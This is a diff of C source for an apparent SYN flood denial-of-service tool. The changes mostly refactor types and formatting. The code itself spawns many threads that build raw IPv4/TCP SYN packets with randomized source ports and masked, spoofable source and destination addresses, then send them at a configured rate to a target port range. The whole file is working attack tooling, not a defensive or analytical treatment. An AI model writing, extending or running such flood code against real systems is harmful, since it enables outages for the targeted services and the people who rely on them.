@@ -6,20 +6,20 @@
 #include "ddos/syn_flood.h"
 
 // session counting
-unsigned int g_syn_num_total;
-unsigned long g_syn_num_generated_in_sec;
+__u64 g_syn_num_total;
+__u64 g_syn_num_generated_in_sec;
 // from main()
-char g_syn_dest_ip[16];
-char g_syn_src_ip[16];
-unsigned int g_syn_src_mask;
-unsigned int g_syn_dest_mask;
-unsigned int g_syn_dest_port_start;
-unsigned int g_syn_dest_port_end;
-unsigned int g_syn_request_per_sec;
+unsigned char g_syn_dest_ip[16];
+unsigned char g_syn_src_ip[16];
+__u32 g_syn_src_mask;
+__u32 g_syn_dest_mask;
+__u32 g_syn_dest_port_start;
+__u32 g_syn_dest_port_end;
+__u32 g_syn_request_per_sec;
 // for masking next ip address
-char g_syn_now_src_ip[16];
-char g_syn_now_dest_ip[16];
-unsigned int g_syn_now_dest_port;
+unsigned char g_syn_now_src_ip[16];
+unsigned char g_syn_now_dest_ip[16];
+__u32 g_syn_now_dest_port;
 // thread
 pthread_mutex_t g_syn_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_syn_cond = PTHREAD_COND_INITIALIZER;
@@ -29,7 +29,8 @@ struct timespec g_syn_now_time;
 
 void syn_flood_print_usage(void)
 {
-	printf("SYN flood Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
+	printf("SYN flood Usage : "
+			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
 	return;
 }
 
@@ -43,15 +44,16 @@ void *generate_syn_flood(void *data)
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_syn_mutex);
 		// get now resource
-		generator(g_syn_src_ip,
-			g_syn_dest_ip,
-			g_syn_src_mask,
-			g_syn_dest_mask,
-			g_syn_dest_port_start,
-			g_syn_dest_port_end,
-			g_syn_now_src_ip,
-			g_syn_now_dest_ip,
-			&g_syn_now_dest_port);
+		generator(
+				g_syn_src_ip,
+				g_syn_dest_ip,
+				g_syn_src_mask,
+				g_syn_dest_mask,
+				g_syn_dest_port_start,
+				g_syn_dest_port_end,
+				g_syn_now_src_ip,
+				g_syn_now_dest_ip,
+				&g_syn_now_dest_port);
 		// make ipv4 header
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
@@ -63,8 +65,8 @@ void *generate_syn_flood(void *data)
 		struct tcphdr tcp_h;
 		tcp_h = prepare_empty_tcp();
 		// set src port number random
-		tcp_h = tcp_set_source(tcp_h, rand() % 65535 + 1);
-		tcp_h = tcp_set_dest(tcp_h, g_syn_now_dest_port);
+		tcp_h = tcp_set_src_port(tcp_h, rand() % 65535 + 1);
+		tcp_h = tcp_set_dest_port(tcp_h, g_syn_now_dest_port);
 		tcp_h = tcp_set_seq(tcp_h, g_syn_num_total);
 		// ***For SYN TCP request, ACK seq should not be provided
 		// tcp_h = tcp_set_ack_seq(tcp_h,35623);
@@ -75,7 +77,11 @@ void *generate_syn_flood(void *data)
 			pthread_cond_wait(&g_syn_cond, &g_syn_mutex);
 		}
 		// time checking
-		time_check(&g_syn_mutex, &g_syn_cond, &g_syn_before_time, &g_syn_now_time, &g_syn_num_generated_in_sec);
+		time_check(
+				&g_syn_cond,
+				&g_syn_before_time,
+				&g_syn_now_time,
+				&g_syn_num_generated_in_sec);
 		// make and send packet
 		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
 		send_packet(sock, ipv4_h, packet, g_syn_now_dest_port);
@@ -93,9 +99,14 @@ void *syn_flood_time_check(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_syn_mutex);
-		time_check(&g_syn_mutex, &g_syn_cond, &g_syn_before_time, &g_syn_now_time, &g_syn_num_generated_in_sec);
+		time_check(
+				&g_syn_cond,
+				&g_syn_before_time,
+				&g_syn_now_time,
+				&g_syn_num_generated_in_sec);
 		pthread_mutex_unlock(&g_syn_mutex);
 	}
+	return (NULL);
 }
 
 void syn_flood_main(char *argv[])
@@ -109,7 +120,8 @@ void syn_flood_main(char *argv[])
 		return;
 	}
 	// get ip address, mask, port
-	split_ip_mask_port(argv,
+	split_ip_mask_port(
+			argv,
 			g_syn_src_ip,
 			g_syn_dest_ip,
 			&g_syn_src_mask,
@@ -127,10 +139,15 @@ void syn_flood_main(char *argv[])
 	for (int i = 0; i < num_threads; i++) {
 		thread_ids[i] = i;
 	}
-	printf("Sending SYN requests to %s using %d threads\n", g_syn_dest_ip, num_threads);
+	printf("Sending SYN requests to %s using %d threads\n",
+			g_syn_dest_ip, num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
-		pthread_create(&threads[i], NULL, generate_syn_flood, (void *)&thread_ids[i]);
+		pthread_create(
+				&threads[i],
+				NULL,
+				generate_syn_flood,
+				(void *)&thread_ids[i]);
 	}
 	pthread_create(&threads[i], NULL, syn_flood_time_check, NULL);
 	for (int i = 0; i < num_threads; i++) {
@@ -138,7 +155,7 @@ void syn_flood_main(char *argv[])
 		printf("thread %d joined\n", i);
 	}
 	pthread_mutex_destroy(&g_syn_mutex);
-	printf("SYN flood finished\nTotal %d packets sent.\n", g_syn_num_total);
+	printf("SYN flood finished\nTotal %lu packets sent.\n", g_syn_num_total);
 	pthread_exit(NULL);
 	return;
 }
